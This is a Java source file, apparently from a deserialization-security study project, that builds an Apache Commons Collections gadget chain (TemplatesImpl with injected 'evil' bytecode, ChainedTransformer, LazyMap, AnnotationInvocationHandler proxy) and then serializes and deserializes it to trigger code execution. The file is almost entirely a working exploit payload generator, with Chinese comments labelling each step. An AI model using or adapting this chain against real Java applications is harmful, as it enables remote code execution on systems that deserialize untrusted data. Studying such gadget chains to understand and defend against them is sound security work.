package Test_CC;

import Test_CC.Test2;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static expUtils.ReflectUtils.getClassByte;

public class Test4 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
//        第一步 生成恶意TemplatesImpl 对象
        TemplatesImpl templates = new TemplatesImpl();
        ReflectUtils.setFields(templates,"_name","9eek");
        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");  // 将文件字节码转为byte[]
        byte[][] templatesEvilCode = new byte[][]{evilCode};
        ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
//        第二步 生成恶意chainTransformer
        Transformer[] transformers= new Transformer[]{
          new ConstantTransformer(TrAXFilter.class),
          new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(null);


        HashMap<String,String> hashMap = new HashMap<>();
        hashMap.put("testKey","testVal");
        Map evilMap = LazyMap.decorate(hashMap,chainedTransformer);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler evilHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);  // 传入lazyMap


//        第三步
        Map evilLazyMap = (Map) Proxy.newProxyInstance(Test2.class.getClassLoader(),evilMap.getClass().getInterfaces(),evilHandler);
        InvocationHandler finalEvilHandler = (InvocationHandler) constructor.newInstance(Target.class, evilLazyMap);  // 传入代理lazyMap

//        第四步
        String path = ExpUtils.serialize(finalEvilHandler);
        ExpUtils.unserialize(path);

    }
}
